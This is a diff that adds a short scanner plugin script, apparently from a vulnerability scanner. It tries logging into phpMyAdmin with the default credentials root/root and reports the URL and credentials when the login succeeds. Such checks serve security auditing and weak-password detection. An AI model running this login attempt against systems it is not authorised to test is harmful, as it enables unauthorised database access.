@@ -1,0 +1,13 @@
+#request url = var
+#define payload = /phpmyadmin/index.php
+#define bug = 更适合在支持
+#define info = /phpmyadmin|root|root
+
+function main(args)
+{
+	res = HttpPost(url.payload,"pma_username=root&pma_password=root&server=1&lang=zh_CN","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
